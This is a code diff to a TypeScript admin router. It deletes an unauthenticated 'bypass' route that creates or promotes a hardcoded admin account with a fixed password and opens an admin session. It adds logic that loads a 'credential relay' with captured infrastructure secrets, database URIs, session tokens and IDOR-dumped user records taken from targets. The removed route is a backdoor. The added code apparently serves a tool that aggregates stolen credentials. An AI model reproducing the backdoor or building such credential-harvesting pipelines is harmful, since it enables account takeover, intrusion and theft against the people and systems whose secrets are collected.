@@ -245,47 +245,6 @@ adminRouter.get("/api/admin/diagnostic/scan/:scanId", requireAdmin, async (req: 
   }
 });
 
-adminRouter.post("/api/admin/bypass", async (req: Request, res: Response) => {
-  // Dev bypass: cria/eleva admin@mse.dev e seta sessão
-  try {
-    const session = req.session as any;
-    log(`[ADMIN BYPASS] start userId=${session?.userId || "none"}`, "security");
-    let userId = session?.userId;
-
-    if (!userId) {
-      const bypassEmail = "admin@mse.dev";
-      let user = await storage.getUserByEmail(bypassEmail);
-      if (!user) {
-        const bcrypt = await import("bcryptjs");
-        const hash = await bcrypt.hash("mse-admin-bypass", 10);
-        user = await storage.createUser({ email: bypassEmail, password: hash });
-        log(`[ADMIN BYPASS] created user ${bypassEmail}`, "security");
-      }
-      await storage.updateUser(user.id, { role: "admin", plan: "pro" });
-      session.userId = user.id;
-      log(`[ADMIN BYPASS] Created admin session for ${bypassEmail}`, "security");
-      return res.json({ success: true, email: bypassEmail, role: "admin" });
-    }
-
-    await storage.updateUser(userId, { role: "admin", plan: "pro" });
-    const user = await storage.getUser(userId);
-    log(`[ADMIN BYPASS] User ${user?.email} elevated to admin`, "security");
-    return res.json({ success: true, email: user?.email, role: "admin" });
-  } catch (err: any) {
-    const msg =
-      (err?.message && err.message.trim()) ||
-      (typeof err === "string" ? err : "unknown error");
-    const stack = err?.stack || "";
-    const details = err ? JSON.stringify(err, Object.getOwnPropertyNames(err)) : "";
-    log(`[ADMIN BYPASS] Error: ${msg} | stack=${stack} | details=${details}`, "security");
-    try {
-      const line = `${new Date().toISOString()} :: ${msg} :: ${stack} :: ${details}\n`;
-      await fs.promises.appendFile(path.join(process.cwd(), "bypass.log"), line);
-    } catch {}
-    return res.status(500).json({ error: "Bypass failed: " + msg, stack, details });
-  }
-});
-
 adminRouter.use("/api/admin", requireAdmin as any);
 
 adminRouter.get("/api/admin/stats", async (_req: Request, res: Response) => {
@@ -298,6 +257,49 @@ adminRouter.get("/api/admin/stats", async (_req: Request, res: Response) => {
 });
 
 adminRouter.get("/api/admin/databridge", async (_req: Request, res: Response) => {
+  // Auto-hydrate relay from recent dumps if memory state is empty
+  if (
+    credentialRelay.credentials.length === 0 &&
+    credentialRelay.infraSecrets.length === 0 &&
+    credentialRelay.dbCredentials.length === 0 &&
+    credentialRelay.sessionTokens.length === 0 &&
+    credentialRelay.discoveredUsers.length === 0
+  ) {
+    const recent = dumpRegistry.slice(0, 20);
+    for (const d of recent) {
+      if (d.category === "infra_secrets" && Array.isArray(d.items)) {
+        relayIngest(
+          d.items.map((v: string) => ({
+            key: "INFRA_SECRET",
+            value: v,
+            type: "SECRET",
+            source: d.filename,
+            target: d.target || "N/A",
+            capturedAt: d.createdAt || new Date().toISOString(),
+          }))
+        );
+      }
+      if (d.category === "database" && Array.isArray(d.items)) {
+        relayIngest(
+          d.items.map((v: string) => ({
+            key: "DB_URI",
+            value: v,
+            type: "URL",
+            source: d.filename,
+            target: d.target || "N/A",
+            capturedAt: d.createdAt || new Date().toISOString(),
+          }))
+        );
+      }
+      if (d.category === "session_tokens" && Array.isArray(d.items)) {
+        relayIngestTokens(d.items);
+      }
+      if (d.category === "idor_dumps" && Array.isArray(d.items)) {
+        relayIngestUsers(d.items);
+      }
+    }
+  }
+
   return res.json({
     type: "CREDENTIAL_RELAY_DATABRIDGE",
     status: "ACTIVE",
